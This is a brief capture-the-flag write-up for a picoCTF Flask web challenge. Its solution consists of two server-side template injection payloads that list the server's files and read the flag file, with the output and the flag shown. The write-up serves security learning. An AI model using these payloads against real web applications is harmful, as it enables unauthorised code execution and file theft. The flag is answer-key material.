# Flaskcards and Freedom
Web exploitation, 900 points

## Description:
> There seem to be a few more files stored on the flash card server but we can't login. Can you?


## Solution:

This challenge linked to a website similar to the one in the [original challenge](Flaskcards.md), and in fact the solution was similar too.

```
Input:
{{''.__class__.mro()[1].__subclasses__()[616]()._module.__builtins__.__import__('os').listdir('.')}}

Output:
['app', 'xinet_startup.sh', 'server.py', 'flag'] 

---

Input:
{{''.__class__.mro()[1].__subclasses__()[616]()._module.__builtins__['open']('flag').read()}}

Output:
picoCTF{R_C_E_wont_let_me_be_33c4aa61} 
```

The flag: picoCTF{R_C_E_wont_let_me_be_33c4aa61} 